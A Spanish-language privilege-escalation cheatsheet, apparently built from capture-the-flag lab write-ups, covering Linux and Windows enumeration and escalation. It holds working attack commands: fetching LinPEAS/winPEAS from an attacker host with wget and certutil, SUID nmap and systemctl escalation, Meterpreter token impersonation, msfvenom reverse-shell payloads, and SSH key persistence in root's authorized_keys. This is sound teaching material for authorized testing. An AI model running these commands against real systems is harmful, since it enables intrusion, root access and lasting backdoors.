# Cheatsheet — Escalada de Privilegios

Notas de post-explotación basadas en [Mr. Robot](../writeups/mr-robot.md), [Vulnuversity](../writeups/vulnuversity.md), [Alfred](../writeups/alfred.md), [Steel Mountain](../writeups/steel-mountain.md) y [Pivot](../writeups/pivot.md).

Casi siempre la escalada se reduce a una de estas cuatro cosas: permisos mal configurados (SUID en Linux, rutas de servicio sin comillas en Windows), credenciales expuestas en archivos de config, software desactualizado con exploit conocido, o tareas/servicios que corre un usuario privilegiado pero que uno de menor privilegio puede modificar.

## Linux

Enumeración automatizada:

```bash
python3 -m http.server 8000   # en el atacante, en el directorio del script
wget http://<IP_atacante>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Enumeración manual clave:

```bash
find / -perm -4000 -type f 2>/dev/null   # binarios SUID
sudo -l                                    # qué puedo correr como root
ps aux
cat /etc/crontab
ls -la /etc/cron.d/
```

Binario SUID encontrado → siempre reviso [GTFOBins](https://gtfobins.github.io/) antes de asumir que sirve. No todos los SUID son explotables.

Mr. Robot — `nmap` con SUID en versión con modo interactivo:

```bash
nmap --interactive
nmap> !sh
whoami
# root
```

Vulnuversity — `systemctl` con SUID, creando un servicio malicioso:

```bash
systemctl enable /dev/shm/root.service
systemctl start root
```

Otras rutas que reviso:

| Técnica | Comando |
|---|---|
| Contraseñas en config | `grep -Ri "password" /var/www/ 2>/dev/null` |
| Bash history | `cat ~/.bash_history` |
| Capabilities | `getcap -r / 2>/dev/null` |
| Kernel desactualizado | `uname -a` → buscar en searchsploit |

## Windows

Enumeración automatizada (certutil es nativo, no necesito subir herramientas extra para descargarlo):

```powershell
certutil.exe -urlcache -f http://<IP_atacante>/winPEASx64.exe wp64.exe
wp64.exe
```

Enumeración manual:

```powershell
whoami /priv
whoami /groups
Get-Service
icacls "C:\ruta"
```

**Token impersonation.** Si `whoami /priv` muestra `SeImpersonatePrivilege` o `SeDebugPrivilege` habilitado, es señal de escalada posible (así en Alfred, con Meterpreter + Incognito):

```
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
```

**Unquoted service path.** Cuando la ruta de un servicio tiene espacios sin comillas, Windows prueba cada segmento como si fuera el binario. Si tengo permiso de escritura en alguna carpeta intermedia, ahí coloco el ejecutable malicioso. Así en Steel Mountain — hay que confirmar tres cosas antes de intentarlo: la ruta sin comillas (`sc qc <servicio>`), permiso de escritura (`icacls`), y que el servicio se pueda reiniciar (`CanRestart = True` en winPEAS/PowerUp).

```powershell
sc stop <servicio>
sc start <servicio>
```

Payloads con msfvenom:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<puerto> -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<puerto> -f exe -o shell.exe
```

## Persistencia (solo en laboratorio / con alcance autorizado)

Usada en Mr. Robot y Vulnuversity — clave pública SSH del atacante en `authorized_keys`, sin crear usuarios ni tocar contraseñas:

```bash
ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub
# en la víctima, con privilegios root:
mkdir -p /root/.ssh
echo "<clave_pública>" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

Esto solo se hace si el alcance del pentest lo contempla explícitamente, y se documenta y remueve al cerrar el compromiso.

## Antes de dar por perdida una máquina

- Corrí LinPEAS/winPEAS
- Revisé binarios SUID / servicios con permisos débiles
- Busqué credenciales en archivos de config y variables de entorno
- Verifiqué privilegios especiales (`sudo -l`, `whoami /priv`)
- Todo binario/servicio sospechoso lo verifiqué en GTFOBins antes de intentar explotarlo
